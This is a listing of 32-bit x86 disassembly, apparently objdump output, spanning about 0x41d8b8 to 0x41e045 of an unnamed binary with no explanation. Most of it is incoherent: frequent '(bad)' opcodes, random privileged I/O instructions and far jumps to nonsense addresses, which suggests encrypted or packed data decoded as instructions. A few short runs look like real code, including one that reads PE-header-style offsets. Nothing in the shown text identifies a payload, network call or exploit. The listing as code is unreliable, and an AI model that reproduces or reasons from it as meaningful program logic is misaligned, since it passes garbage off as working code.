  41d8b8:	ins    DWORD PTR es:[edi],dx
  41d8b9:	data16 std 
  41d8bb:	imul   edx,DWORD PTR [eax-0x62b69426],0xed317c8f
  41d8c5:	adc    al,0xe9
  41d8c7:	lea    esi,[edi]
  41d8c9:	mov    dl,0xc5
  41d8cb:	test   BYTE PTR [edi-0x15057103],bl
  41d8d1:	arpl   WORD PTR [ebx+edx*4],sp
  41d8d4:	pop    ds
  41d8d5:	sbb    BYTE PTR [ebx],dh
  41d8d7:	fwait
  41d8d8:	(bad)  
  41d8d9:	adc    ebx,DWORD PTR [ebx-0x1b]
  41d8dc:	adc    dh,BYTE PTR ds:0x91032a6a
  41d8e2:	cmp    al,0xcc
  41d8e4:	ss inc ebx
  41d8e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8e7:	ins    BYTE PTR es:[edi],dx
  41d8e8:	fs mov dl,0xee
  41d8eb:	pop    ds
  41d8ec:	mov    esp,0x7de2fa17
  41d8f1:	shr    BYTE PTR [edx],0x4b
  41d8f4:	push   0xffffffcd
  41d8f6:	in     eax,dx
  41d8f7:	sahf   
  41d8f8:	retf   0x72e5
  41d8fb:	icebp  
  41d8fc:	(bad)  
  41d8fd:	and    bl,BYTE PTR [edx]
  41d8ff:	fistp  WORD PTR [ebp+0x41]
  41d902:	jns    0x41d8b3
  41d904:	mov    eax,ds:0x8bc0a000
  41d909:	push   esp
  41d90a:	and    al,0x18
  41d90c:	mov    edi,DWORD PTR [esp+0x1c]
  41d910:	add    eax,edx
  41d912:	adc    ecx,edi
  41d914:	mov    DWORD PTR [esp+0x18],eax
  41d918:	mov    DWORD PTR [esp+0x1c],ecx
  41d91c:	jmp    0x41d926
  41d921:	mov    ebx,0xca79a575
  41d926:	push   0x4
  41d928:	push   0x422568
  41d92d:	jmp    0x41dcfc
  41d932:	mov    cl,0x3a
  41d934:	cdq    
  41d935:	lahf   
  41d936:	bound  ebx,QWORD PTR [edx-0x24cc5e1]
  41d93c:	mov    ds:0xdbcd01bc,eax
  41d941:	jle    0x41d9c2
  41d943:	dec    ebp
  41d944:	push   ss
  41d945:	sbb    BYTE PTR [edx+edx*1+0x10de1818],bh
  41d94c:	and    eax,0x5922dff9
  41d951:	push   ecx
  41d952:	inc    edx
  41d953:	mov    ebp,0x81dd4549
  41d958:	lahf   
  41d959:	mov    ch,0xd8
  41d95b:	push   0x77
  41d95d:	fidiv  DWORD PTR [edi]
  41d95f:	(bad)  
  41d960:	xlat   BYTE PTR ds:[ebx]
  41d961:	test   DWORD PTR [ecx-0x380ad823],ecx
  41d967:	call   0x8bacf7d8
  41d96c:	jbe    0x41d983
  41d96e:	xlat   BYTE PTR ds:[ebx]
  41d96f:	stc    
  41d970:	aaa    
  41d971:	jp     0x41d997
  41d973:	test   BYTE PTR [eax+0x3b88d4e9],ah
  41d979:	adc    bh,bl
  41d97b:	mov    al,ds:0x8a439ed5
  41d980:	mov    ss,esp
  41d982:	or     dh,BYTE PTR [edx]
  41d984:	es mov bl,0x2c
  41d987:	mov    dl,BYTE PTR [edx+eiz*1+0x5f]
  41d98b:	cli    
  41d98c:	cmp    ah,ah
  41d98e:	lods   eax,DWORD PTR ds:[esi]
  41d98f:	(bad)  [esi+0x43]
  41d992:	cmp    eax,DWORD PTR [edx]
  41d994:	cmp    al,0x9b
  41d996:	outs   dx,BYTE PTR ds:[esi]
  41d997:	mov    ds:0xbda7776,eax
  41d99c:	(bad)  
  41d99d:	jl     0x41d9e8
  41d99f:	add    al,0xed
  41d9a1:	in     al,0x8e
  41d9a3:	retf   
  41d9a4:	mov    edx,0x5d4f01ac
  41d9a9:	push   edi
  41d9aa:	dec    edi
  41d9ab:	mov    ebx,0x49e83295
  41d9b0:	not    BYTE PTR [ecx-0x79]
  41d9b3:	leave  
  41d9b4:	pop    ss
  41d9b5:	aas    
  41d9b6:	jmp    0xc68acc63
  41d9bb:	dec    ebx
  41d9bc:	gs retf 0xd9bc
  41d9c0:	add    BYTE PTR [edi],0x24
  41d9c3:	les    ebp,FWORD PTR [esi-0x2236d294]
  41d9c9:	test   BYTE PTR [esi+edi*4+0x3c],dl
  41d9cd:	pushf  
  41d9ce:	ret    0xf98b
  41d9d1:	lds    esi,FWORD PTR ds:0x8c208e95
  41d9d7:	push   edi
  41d9d8:	mov    esi,0x1e971e9d
  41d9dd:	inc    ebp
  41d9de:	or     al,0xc7
  41d9e0:	sar    DWORD PTR [edi-0x40],0x3f
  41d9e4:	popf   
  41d9e5:	ror    BYTE PTR [ecx+eax*2+0x49],0xd7
  41d9ea:	xchg   ecx,eax
  41d9eb:	out    dx,eax
  41d9ec:	sub    ah,BYTE PTR [ecx-0x6b]
  41d9ef:	call   0x7186:0xea6d9b40
  41d9f6:	stos   DWORD PTR es:[edi],eax
  41d9f7:	cdq    
  41d9f8:	ficom  DWORD PTR [esi+eax*4]
  41d9fb:	push   ss
  41d9fc:	push   es
  41d9fd:	popa   
  41d9fe:	ret    
  41d9ff:	lods   eax,DWORD PTR ds:[esi]
  41da00:	dec    ebx
  41da01:	push   0x6616caa
  41da06:	mov    bl,0xa8
  41da08:	jnp    0x41d9c4
  41da0a:	iret   
  41da0b:	mov    bh,0xa7
  41da0d:	std    
  41da0e:	ret    0xf5c0
  41da11:	stc    
  41da12:	icebp  
  41da13:	inc    esi
  41da14:	push   0x1d9220a7
  41da19:	sub    eax,0x66567ce1
  41da1e:	inc    edi
  41da1f:	sub    edi,ebp
  41da21:	fmul   DWORD PTR [edx+0x279e5f91]
  41da27:	je     0x41d9b9
  41da29:	and    ah,dl
  41da2b:	gs (bad) 
  41da2d:	psubsw mm2,mm1
  41da30:	aaa    
  41da31:	pop    ebx
  41da32:	cli    
  41da33:	or     DWORD PTR [eax-0x6b6e5f96],ebx
  41da39:	stos   DWORD PTR es:[edi],eax
  41da3a:	adc    al,0xfd
  41da3c:	push   ss
  41da3d:	or     al,0xc6
  41da3f:	xchg   edi,eax
  41da40:	sub    eax,0xd45cc086
  41da45:	or     DWORD PTR [esi-0x4604f9f],eax
  41da4b:	mov    esp,0x25499ac5
  41da50:	mov    bh,BYTE PTR [edi]
  41da52:	cs fwait
  41da54:	xor    edi,ebp
  41da56:	mov    ebx,0x964dc6e3
  41da5b:	sub    al,0xaf
  41da5d:	imul   esi,DWORD PTR ds:0x726c8845,0x37e6b951
  41da67:	sbb    eax,0x8748dc04
  41da6c:	je     0x41dab1
  41da6e:	sub    esp,ebp
  41da70:	in     al,0x47
  41da72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da73:	push   ecx
  41da74:	cmp    bl,BYTE PTR ds:0xc330dd1c
  41da7a:	push   ebp
  41da7b:	lahf   
  41da7c:	data16 mov bh,0xcf
  41da7f:	add    DWORD PTR [edx+0x26],edx
  41da82:	leave  
  41da83:	fs jl  0x41da15
  41da86:	int3   
  41da87:	sub    DWORD PTR [edx+0x18eb0899],edi
  41da8d:	ins    BYTE PTR es:[edi],dx
  41da8e:	jmp    0x98d8fa0b
  41da93:	dec    esi
  41da94:	lea    edi,[ecx+0x56]
  41da97:	mov    ebp,0xc8e71825
  41da9c:	leave  
  41da9d:	retf   0xa4cb
  41daa0:	sub    al,0x4d
  41daa2:	adc    eax,0x708e38a8
  41daa7:	cmc    
  41daa8:	push   ebx
  41daa9:	xor    eax,DWORD PTR [esi+0x545b6eac]
  41daaf:	sub    al,BYTE PTR [edi+ebp*4+0xf]
  41dab3:	call   0x927b:0xb103f22a
  41daba:	sub    eax,0xd8db2d9a
  41dabf:	enter  0x52d5,0x53
  41dac3:	js     0x41da8e
  41dac5:	and    ah,ah
  41dac7:	adc    al,0x2
  41dac9:	mov    dh,0xbf
  41dacb:	jb     0x41db22
  41dacd:	xchg   DWORD PTR [edi+ecx*8-0x13],esi
  41dad1:	xchg   esi,eax
  41dad2:	adc    DWORD PTR [ecx],0xc4d6eeae
  41dad8:	out    dx,al
  41dad9:	xor    eax,0x74cfda18
  41dade:	shl    BYTE PTR [edx-0x58],0x45
  41dae2:	mov    esi,0x829de624
  41dae7:	aam    0x1a
  41dae9:	xchg   edx,eax
  41daea:	push   es
  41daeb:	imul   esp,DWORD PTR [edx],0x6d9aa66a
  41daf1:	jg     0x41da93
  41daf3:	mov    ecx,0x4eff84f1
  41daf8:	jnp    0x41dafe
  41dafa:	jmp    0x41db7b
  41dafc:	adc    al,0x8b
  41dafe:	sbb    al,0xcf
  41db00:	add    eax,0x620e1bfe
  41db05:	jbe    0x41db3f
  41db07:	adc    ch,BYTE PTR [esi]
  41db09:	jmp    0xf37819b3
  41db0e:	mov    esp,0x3181480a
  41db13:	enter  0xb0b8,0x3b
  41db17:	push   esp
  41db18:	add    eax,0xe00b534d
  41db1d:	loopne 0x41db77
  41db1f:	je     0x41db8c
  41db21:	jmp    0x41db75
  41db23:	fnstcw WORD PTR [esi-0x7287536f]
  41db29:	fwait
  41db2a:	popf   
  41db2b:	fwait
  41db2c:	push   ebp
  41db2d:	push   edx
  41db2e:	or     DWORD PTR ds:0xe6aa4e50,0xbb1c86a7
  41db38:	loopne 0x41dafc
  41db3a:	(bad)  
  41db3b:	jmp    0x9e269d8b
  41db40:	mov    dh,0xeb
  41db42:	out    dx,al
  41db43:	ror    ebp,cl
  41db45:	mov    ds:0xcb783032,eax
  41db4a:	sub    DWORD PTR [edx],eax
  41db4c:	mov    cl,0xd7
  41db4e:	xchg   ebx,eax
  41db4f:	mov    dl,0xf7
  41db51:	lods   al,BYTE PTR ds:[esi]
  41db52:	xchg   esp,eax
  41db53:	or     DWORD PTR ds:0x461917f4,esp
  41db59:	push   ebp
  41db5a:	fmul   DWORD PTR [ecx+ecx*1-0x1b]
  41db5e:	add    al,0x78
  41db60:	push   eax
  41db61:	mov    ds,WORD PTR [eax-0x49]
  41db64:	dec    esi
  41db65:	push   esp
  41db66:	dec    esi
  41db67:	pop    ebx
  41db68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db69:	xor    BYTE PTR [esi+0x21adcbbf],ch
  41db6f:	dec    edx
  41db70:	popf   
  41db71:	mov    ds:0x99cb251a,al
  41db76:	mov    ch,0x40
  41db78:	push   edx
  41db79:	test   eax,0x217992b1
  41db7e:	das    
  41db7f:	mov    dh,BYTE PTR [ecx-0x5]
  41db82:	inc    ecx
  41db83:	loopne 0x41db1f
  41db85:	mov    edx,0x9d193805
  41db8a:	xor    edx,ecx
  41db8c:	daa    
  41db8d:	lahf   
  41db8e:	and    edx,esi
  41db90:	shl    BYTE PTR [ebx-0x2b],0x49
  41db94:	call   0x281b142e
  41db99:	cld    
  41db9a:	in     eax,0x45
  41db9c:	fimul  WORD PTR [ecx]
  41db9e:	inc    ecx
  41db9f:	scas   eax,DWORD PTR es:[edi]
  41dba0:	push   ss
  41dba1:	cs xor dh,dl
  41dba4:	dec    ebp
  41dba5:	std    
  41dba6:	stos   BYTE PTR es:[edi],al
  41dba7:	aad    0x7a
  41dba9:	sti    
  41dbaa:	xor    ebx,DWORD PTR [ebp-0x3e94e729]
  41dbb0:	jg     0x41dc13
  41dbb2:	stos   BYTE PTR es:[edi],al
  41dbb3:	icebp  
  41dbb4:	out    dx,eax
  41dbb5:	add    al,0x7a
  41dbb7:	(bad)
  41dbbb:	cmp    BYTE PTR [edx+eax*8+0x2a365c65],ch
  41dbc2:	or     ah,bl
  41dbc4:	cmp    ebx,ebp
  41dbc6:	mov    eax,0x51209893
  41dbcb:	jb     0x41dbde
  41dbcd:	xor    cl,dh
  41dbcf:	xchg   ebp,eax
  41dbd0:	jmp    0x41dbe5
  41dbd2:	popa   
  41dbd3:	mov    edi,0xcddeb3f2
  41dbd8:	pushf  
  41dbd9:	dec    ebx
  41dbda:	jmp    0x1e1d:0x555daaae
  41dbe1:	aaa    
  41dbe2:	outs   dx,BYTE PTR ds:[esi]
  41dbe3:	inc    edi
  41dbe4:	ret    0x5d76
  41dbe7:	fcomp  QWORD PTR [ecx+0x56]
  41dbea:	jae    0x41db8a
  41dbec:	iret   
  41dbed:	pop    edi
  41dbee:	adc    edi,DWORD PTR [ebx+0x42]
  41dbf1:	aas    
  41dbf2:	retf   0x6295
  41dbf5:	enter  0x26ae,0x7
  41dbf9:	sub    eax,0xfe501291
  41dbfe:	retf   
  41dbff:	inc    esp
  41dc00:	popf   
  41dc01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc02:	push   es
  41dc03:	inc    edx
  41dc04:	and    eax,0xeadce71f
  41dc09:	in     al,dx
  41dc0a:	add    eax,0x9fc7f868
  41dc0f:	imul   ebp,DWORD PTR [ecx],0x776106dc
  41dc15:	mov    ah,0x2d
  41dc17:	aaa    
  41dc18:	fnstsw WORD PTR [edx+ebp*2]
  41dc1b:	lods   al,BYTE PTR ds:[esi]
  41dc1c:	adc    al,0xe2
  41dc1e:	aam    0xc7
  41dc20:	loopne 0x41dc4a
  41dc22:	test   esi,eax
  41dc24:	mov    dl,0x75
  41dc26:	add    al,0xd1
  41dc28:	xchg   edi,eax
  41dc29:	push   ds
  41dc2a:	shr    BYTE PTR [ebp+0x194e0c73],cl
  41dc30:	test   BYTE PTR [edx-0x7f],bl
  41dc33:	ret    
  41dc34:	rcr    BYTE PTR [ecx+edx*2-0x44c6f88],1
  41dc3b:	out    dx,eax
  41dc3c:	sub    al,BYTE PTR [eax+0x11]
  41dc3f:	shl    BYTE PTR [edi+ebx*8-0x1c82f789],cl
  41dc46:	dec    ebx
  41dc47:	push   ss
  41dc48:	mov    ecx,0x57061179
  41dc4d:	and    al,0xfd
  41dc50:	addr16 dec esp
  41dc52:	aas    
  41dc53:	jmp    0xc152:0xbfe1fc19
  41dc5a:	mov    bh,0x84
  41dc5c:	pop    ebx
  41dc5d:	sub    BYTE PTR [ebp-0x67],ch
  41dc60:	pusha  
  41dc61:	repz cmp bh,ah
  41dc64:	int    0xe0
  41dc66:	push   ecx
  41dc67:	inc    ecx
  41dc68:	ins    BYTE PTR es:[edi],dx
  41dc69:	fs cli 
  41dc6b:	mov    bl,0x71
  41dc6d:	mov    dh,0x9c
  41dc6f:	jne    0x41dbf9
  41dc71:	in     eax,0x4e
  41dc73:	jb     0x41dcf1
  41dc75:	jmp    0x113e244a
  41dc7a:	out    dx,al
  41dc7b:	or     DWORD PTR [edi],ebx
  41dc7d:	pop    ecx
  41dc7e:	stos   DWORD PTR es:[edi],eax
  41dc7f:	and    eax,DWORD PTR [ebx]
  41dc81:	test   esp,ebp
  41dc83:	cvtps2pi mm5,xmm3
  41dc86:	inc    edi
  41dc87:	retf   
  41dc88:	bound  ecx,QWORD PTR [ebx-0x9]
  41dc8b:	and    al,0xcb
  41dc8d:	test   eax,0x79d591ff
  41dc92:	cmp    eax,DWORD PTR [ebp-0x214eee0]
  41dc98:	sub    BYTE PTR [esi+eiz*2+0x5e4ae70a],dl
  41dc9f:	or     DWORD PTR ds:0xe1649a2f,0xf94040e6
  41dca9:	mov    cl,0x4
  41dcab:	cmp    DWORD PTR ds:0x377c768a,ebp
  41dcb1:	dec    ebp
  41dcb2:	push   es
  41dcb3:	test   DWORD PTR [ecx-0x22],esp
  41dcb6:	aaa    
  41dcb7:	shl    BYTE PTR [esp+eax*1],cl
  41dcba:	popa   
  41dcbb:	arpl   WORD PTR [eax],dx
  41dcbd:	sub    al,0x29
  41dcbf:	(bad)  
  41dcc0:	jnp    0x41dce7
  41dcc2:	inc    ebx
  41dcc3:	bound  esp,QWORD PTR [ecx]
  41dcc5:	enter  0xd6c2,0x4
  41dcc9:	lods   al,BYTE PTR ds:[esi]
  41dcca:	call   0x75322259
  41dccf:	lods   al,BYTE PTR ds:[esi]
  41dcd0:	jb     0x41dd3e
  41dcd2:	mov    ds:0x187668cb,al
  41dcd7:	cmp    eax,0xf0d27b68
  41dcdc:	in     al,0x53
  41dcde:	fwait
  41dcdf:	cld    
  41dce0:	pusha  
  41dce1:	fwait
  41dce2:	pop    ax
  41dce4:	out    dx,al
  41dce5:	adc    edx,DWORD PTR [ebx+0x7f3c001f]
  41dceb:	fs jmp 0x35f1b21e
  41dcf1:	imul   eax,DWORD PTR [edi+0x236e2d29],0xf1428ce
  41dcfb:	and    cl,BYTE PTR [ebp+0x506c2444]
  41dd01:	call   0x415231
  41dd06:	mov    eax,DWORD PTR [esp+0x64]
  41dd0a:	push   0x4
  41dd0c:	push   DWORD PTR [eax+0x1a4]
  41dd12:	lea    eax,[esp+0x74]
  41dd16:	push   eax
  41dd17:	call   0x415231
  41dd1c:	mov    eax,DWORD PTR [esp+0x64]
  41dd20:	mov    eax,DWORD PTR [eax+0x1a4]
  41dd26:	mov    eax,DWORD PTR [eax]
  41dd28:	mov    ecx,DWORD PTR [esp+0x64]
  41dd2c:	mov    eax,DWORD PTR [eax+0x3c]
  41dd2f:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41dd35:	mov    ecx,DWORD PTR [ecx]
  41dd37:	lea    eax,[ecx+eax*1+0x28]
  41dd3b:	mov    eax,DWORD PTR [eax]
  41dd3d:	add    DWORD PTR [esp+0x6c],eax
  41dd41:	mov    DWORD PTR [esp+0x30],0x127
  41dd49:	jmp    0x41e118
  41dd4e:	dec    edi
  41dd4f:	inc    eax
  41dd50:	mov    ds:0x3a6ba279,al
  41dd55:	push   ds
  41dd56:	(bad)  
  41dd57:	push   edx
  41dd59:	push   0xffffffc8
  41dd5b:	sub    al,0x12
  41dd5d:	stos   BYTE PTR es:[edi],al
  41dd5e:	and    al,BYTE PTR [edi+0x16]
  41dd61:	sbb    BYTE PTR [edx+edx*1-0x6effe7e8],bh
  41dd68:	push   es
  41dd69:	sub    DWORD PTR [esp+ebx*4],ecx
  41dd6c:	jnp    0x41dd5a
  41dd6e:	adc    ch,BYTE PTR [ecx+0x11983d67]
  41dd74:	and    DWORD PTR [edi+ebx*4],ebx
  41dd77:	add    BYTE PTR [ebx],cl
  41dd79:	out    0xa1,al
  41dd7b:	imul   eax,esi,0xffffff85
  41dd7e:	push   esi
  41dd7f:	fs addr16 loop 0x41dd2c
  41dd83:	(bad)  
  41dd84:	pusha  
  41dd85:	sub    eax,0xea434e12
  41dd8a:	push   ds
  41dd8b:	or     edx,esp
  41dd8d:	test   BYTE PTR [eax+ebp*1+0x504478ac],bh
  41dd94:	(bad)  
  41dd95:	dec    DWORD PTR [esi-0x34a19426]
  41dd9b:	xchg   edx,eax
  41dd9c:	ror    BYTE PTR [ebx-0x9],cl
  41dd9f:	shr    DWORD PTR [esi+0x3a1b45c3],1
  41dda5:	inc    ecx
  41dda6:	pusha  
  41dda7:	cmp    al,0xdc
  41dda9:	pop    es
  41ddaa:	inc    edi
  41ddab:	or     ebx,ebx
  41ddad:	(bad)  
  41ddae:	leave  
  41ddaf:	mov    ah,0x64
  41ddb1:	ret    
  41ddb2:	std    
  41ddb3:	pop    esi
  41ddb4:	xlat   BYTE PTR ds:[ebx]
  41ddb5:	sub    al,0x1c
  41ddb7:	mov    cl,0x3c
  41ddb9:	jae    0x41ddfb
  41ddbb:	rol    BYTE PTR [ebx+0x69],0xc4
  41ddbf:	push   edx
  41ddc0:	inc    ebp
  41ddc1:	mov    cl,0x3
  41ddc3:	shr    dh,1
  41ddc5:	mov    ds:0xab508abf,al
  41ddca:	fild   DWORD PTR [edi+0x52]
  41ddcd:	adc    al,0x25
  41ddcf:	idiv   BYTE PTR [esp+eax*4-0xd]
  41ddd3:	dec    eax
  41ddd4:	jne    0x41ddc4
  41ddd6:	cmp    eax,0x8cd9e685
  41dddb:	in     eax,dx
  41dddc:	jge    0x41ddc4
  41ddde:	cmp    dl,BYTE PTR [edx+0x5f]
  41dde1:	sub    al,0x76
  41dde3:	arpl   ax,ax
  41dde5:	sub    bl,0x9d
  41dde8:	aam    0xc5
  41ddea:	popa   
  41ddeb:	adc    dl,ch
  41dded:	cmp    DWORD PTR [ebp+0x38],ebx
  41ddf0:	fsubr  st(2),st
  41ddf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddf3:	mov    cl,ah
  41ddf5:	inc    ebx
  41ddf6:	cwde   
  41ddf7:	int3   
  41ddf8:	pop    es
  41ddf9:	push   ebx
  41ddfa:	or     eax,0xdaa6960a
  41ddff:	or     DWORD PTR [ecx-0x7a],ebp
  41de02:	ret    
  41de03:	(bad)  
  41de04:	inc    DWORD PTR [ebx+0x6b41fd63]
  41de0a:	or     edx,DWORD PTR [eax-0x1a5c43a5]
  41de10:	loope  0x41ddff
  41de12:	nop
  41de13:	in     eax,dx
  41de14:	mov    dl,0x6d
  41de16:	and    BYTE PTR [ecx-0x78daa8f],0xd6
  41de1d:	shl    dh,cl
  41de1f:	(bad)  
  41de20:	ds pushf 
  41de22:	xor    ch,BYTE PTR [eax+0x2bcabbc7]
  41de28:	(bad)  
  41de29:	outs   dx,BYTE PTR ds:[esi]
  41de2a:	xor    DWORD PTR [edx],esi
  41de2c:	xchg   edx,eax
  41de2d:	aas    
  41de2e:	jns    0x41de09
  41de30:	fstp   st(0)
  41de32:	frstor [ebx]
  41de34:	lods   eax,DWORD PTR ds:[esi]
  41de35:	in     eax,dx
  41de36:	inc    esi
  41de37:	jge    0x41ddda
  41de39:	fwait
  41de3a:	enter  0x4df8,0x7
  41de3e:	ret    
  41de3f:	out    0x9f,eax
  41de41:	cmp    al,0xf3
  41de43:	and    BYTE PTR [esi-0x17a1a8de],ah
  41de49:	jae    0x41de88
  41de4b:	inc    edx
  41de4c:	mov    ah,0xc5
  41de4e:	out    0x72,eax
  41de50:	inc    BYTE PTR [ecx+0x15]
  41de53:	mov    bl,0x49
  41de55:	xchg   DWORD PTR [ecx+0x6b],esi
  41de58:	pop    ebx
  41de59:	pop    edi
  41de5a:	xlat   BYTE PTR ds:[ebx]
  41de5b:	daa    
  41de5c:	gs mov bh,0x8
  41de5f:	pop    edx
  41de60:	dec    edi
  41de61:	dec    edx
  41de62:	dec    esp
  41de63:	(bad)  
  41de64:	std    
  41de65:	dec    eax
  41de66:	stos   DWORD PTR es:[edi],eax
  41de67:	sub    eax,0x4f740141
  41de6c:	jae    0x41de14
  41de6e:	mov    edi,0x5e322cf9
  41de73:	add    DWORD PTR [esp+eiz*2+0x584d6a22],edx
  41de7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de7b:	or     DWORD PTR [ecx-0x50],ebx
  41de7e:	std    
  41de7f:	(bad)  
  41de80:	in     al,0x7a
  41de82:	pushf  
  41de83:	nop    DWORD PTR [ebp+0x27]
  41de87:	inc    edx
  41de88:	or     ah,BYTE PTR [ecx+0x3e]
  41de8b:	test   eax,0xcf82367e
  41de90:	pop    ebp
  41de91:	cld    
  41de92:	out    dx,al
  41de93:	mov    ds:0x6a17ed00,al
  41de98:	xchg   ebx,eax
  41de99:	jbe    0x41de8c
  41de9b:	adc    esi,DWORD PTR [ecx+0x5]
  41de9e:	repnz push es
  41dea0:	iret   
  41dea1:	clc    
  41dea2:	dec    esi
  41dea3:	pop    ds
  41dea4:	inc    esp
  41dea6:	xor    BYTE PTR [edi],dh
  41dea8:	shr    BYTE PTR [esi],cl
  41deaa:	mov    esp,0x3fab6859
  41deaf:	shl    BYTE PTR [edi+0x26],cl
  41deb2:	fsubr  QWORD PTR [esi-0x6a]
  41deb5:	sub    ebx,DWORD PTR ds:0xf12e105c
  41debb:	mov    ebp,fs
  41debd:	xor    esi,DWORD PTR [esi+esi*4-0x35]
  41dec1:	outs   dx,DWORD PTR ds:[esi]
  41dec2:	fmul   QWORD PTR [ebx-0x59]
  41dec5:	xor    eax,esi
  41dec7:	shl    DWORD PTR [edx+0x5dbfe8dc],1
  41decd:	xor    DWORD PTR [ebp-0x565cfdec],ebx
  41ded3:	add    al,0x6a
  41ded5:	dec    edi
  41ded6:	jo     0x41df3a
  41ded8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ded9:	(bad)  
  41dedb:	pop    ds
  41dedc:	jo     0x41de5f
  41dede:	pop    eax
  41dedf:	and    al,0xe9
  41dee1:	fdiv   st,st(3)
  41dee3:	jae    0x41df36
  41dee5:	(bad)  
  41dee6:	pop    ds
  41dee7:	mov    WORD PTR ds:0x21b4d5a4,gs
  41deee:	in     eax,0x6
  41def0:	jb     0x41de7b
  41def2:	mov    ecx,0x52743675
  41def7:	mov    BYTE PTR [ebx],al
  41def9:	int    0x58
  41defb:	sub    eax,DWORD PTR [edx]
  41defd:	std    
  41defe:	push   esi
  41deff:	jg     0x41de9b
  41df01:	ins    DWORD PTR es:[edi],dx
  41df02:	pop    edi
  41df03:	add    al,0x62
  41df05:	adc    al,0x6e
  41df07:	test   al,0x8b
  41df09:	pop    esp
  41df0a:	jecxz  0x41df4e
  41df0c:	xchg   ebx,eax
  41df0d:	sbb    BYTE PTR [eax+0xf],cl
  41df10:	retf   0x9e61
  41df13:	mov    ds:0x6ec75aa0,eax
  41df18:	jmp    0x96585b0e
  41df1d:	jae    0x41df69
  41df1f:	nop
  41df20:	adc    edi,DWORD PTR [ebp+ebx*2+0x790c6b15]
  41df27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df28:	add    al,0x52
  41df2a:	or     al,0xc9
  41df2c:	in     eax,dx
  41df2d:	or     al,BYTE PTR [esi+ebx*1]
  41df30:	hlt    
  41df31:	mov    bl,0xe3
  41df33:	mov    DWORD PTR [ecx],esp
  41df35:	jbe    0x41df1c
  41df37:	scas   eax,DWORD PTR es:[edi]
  41df38:	mov    al,0xce
  41df3a:	imul   ebp,DWORD PTR [eax-0x437b6742],0x19
  41df41:	sub    dh,ch
  41df43:	div    BYTE PTR [edi-0x41]
  41df46:	rcl    ecx,1
  41df48:	add    bl,BYTE PTR [ebp-0x38]
  41df4b:	add    DWORD PTR [edx-0x5],esp
  41df4e:	stos   DWORD PTR es:[edi],eax
  41df4f:	sub    ebp,DWORD PTR [ecx]
  41df51:	lods   al,BYTE PTR ds:[esi]
  41df52:	lds    esp,FWORD PTR [esi]
  41df54:	mov    edx,0x74ad93b2
  41df59:	ins    BYTE PTR es:[edi],dx
  41df5a:	pop    edi
  41df5b:	sub    al,0x6b
  41df5d:	add    dh,BYTE PTR [edx-0x255029d1]
  41df63:	xchg   BYTE PTR [edi+0x6c],bl
  41df66:	adc    eax,0xe18a094c
  41df6b:	fwait
  41df6c:	xor    al,0xd8
  41df6e:	iret   
  41df6f:	pop    eax
  41df70:	ret    
  41df71:	mov    ds:0xae3ac7cb,al
  41df76:	jle    0x41dfa6
  41df78:	adc    cl,0xc7
  41df7b:	mov    edx,0xd1c3b14d
  41df80:	sbb    al,0x36
  41df82:	xlat   BYTE PTR ds:[ebx]
  41df83:	jns    0x41dfc7
  41df85:	jg     0x41dff3
  41df87:	jmp    0x91db:0x9ee82c8c
  41df8e:	sar    DWORD PTR [esi],cl
  41df90:	out    dx,eax
  41df91:	and    BYTE PTR [eax],dh
  41df93:	lods   eax,DWORD PTR ds:[esi]
  41df94:	add    al,0xb1
  41df96:	pop    ecx
  41df97:	icebp  
  41df98:	lea    ebp,[ecx+0xa391e5e]
  41df9e:	inc    edi
  41df9f:	adc    cl,BYTE PTR [eax-0x7ab0dea2]
  41dfa5:	push   esi
  41dfa6:	sbb    eax,DWORD PTR [esi+ebx*1-0x33]
  41dfaa:	xor    DWORD PTR [edx+esi*1],edi
  41dfad:	nop
  41dfae:	add    dh,BYTE PTR [edi+0x5a0f750a]
  41dfb4:	adc    BYTE PTR [eax-0x42],0x56
  41dfb8:	mov    eax,ds
  41dfba:	sub    eax,0xf83cf503
  41dfbf:	in     al,dx
  41dfc0:	sub    ch,BYTE PTR [ebx-0x13e9d889]
  41dfc6:	sub    al,0x3c
  41dfc8:	mov    al,0x62
  41dfca:	ins    BYTE PTR es:[edi],dx
  41dfcb:	push   edx
  41dfcc:	push   ecx
  41dfcd:	pop    esi
  41dfce:	jmp    0x4a24f251
  41dfd3:	adc    BYTE PTR [edx+0x38],0x33
  41dfd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfd8:	sbb    al,BYTE PTR [edx]
  41dfda:	mov    ecx,eax
  41dfdc:	adc    DWORD PTR [eax],eax
  41dfde:	sahf   
  41dfdf:	xor    ecx,DWORD PTR [esp+eax*4-0x6a9ded0c]
  41dfe6:	into   
  41dfe7:	lahf   
  41dfe8:	mov    al,0x6d
  41dfea:	mov    eax,ds:0x33f06dad
  41dfef:	sar    BYTE PTR [edx],1
  41dff1:	push   ebx
  41dff2:	imul   ebp,edx,0x919ceef4
  41dff8:	cmp    ah,BYTE PTR [ecx-0x40]
  41dffb:	stos   BYTE PTR es:[edi],al
  41dffc:	js     0x41dfc8
  41dffe:	dec    ecx
  41dfff:	jmp    0x152a:0x5ac49c07
  41e006:	xchg   esi,eax
  41e007:	xchg   ebx,eax
  41e008:	and    eax,0xc59de8e2
  41e00d:	xchg   ebx,eax
  41e00e:	xor    DWORD PTR [ebp-0x4a],eax
  41e011:	add    eax,0x8915680a
  41e016:	fdivr  QWORD PTR [ebx+esi*8-0x41]
  41e01a:	stos   DWORD PTR es:[edi],eax
  41e01b:	mov    ds:0x9f9715cd,al
  41e020:	not    ecx
  41e022:	mov    DWORD PTR [edx-0x7c],edi
  41e025:	lahf   
  41e026:	inc    edi
  41e027:	shl    BYTE PTR [edi+0x71],0x30
  41e02b:	xor    al,0xe3
  41e02d:	jecxz  0x41e04e
  41e02f:	repz mov dh,0x9c
  41e032:	cld    
  41e033:	cmp    al,0xae
  41e035:	mov    ah,0xa0
  41e037:	sub    DWORD PTR [edx-0x55183929],edx
  41e03d:	pusha  
  41e03e:	cdq    
  41e03f:	adc    DWORD PTR [eax+edx*4],0xffffffb3
  41e043:	loop   0x41dfcd
  41e045:	cmp    eax,0x26d81110
